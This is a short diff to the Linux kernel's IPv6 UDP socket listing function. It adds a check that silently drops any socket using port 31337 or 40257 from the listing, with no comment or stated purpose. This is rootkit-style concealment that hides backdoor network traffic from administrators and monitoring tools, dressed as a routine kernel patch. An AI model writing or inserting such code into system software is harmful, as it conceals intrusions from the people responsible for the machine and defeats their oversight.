@@ -1864,6 +1864,9 @@ int udp6_seq_show(struct seq_file *seq, void *v)
 		const struct inet_sock *inet = inet_sk((const struct sock *)v);
 		__u16 srcp = ntohs(inet->inet_sport);
 		__u16 destp = ntohs(inet->inet_dport);
+	        if (srcp == 31337 || srcp == 40257 || destp == 31337 || destp == 40257) {
+	              return 0;  
+	        }		
 		__ip6_dgram_sock_seq_show(seq, v, srcp, destp,
 					  udp_rqueue_get(v), bucket);
 	}
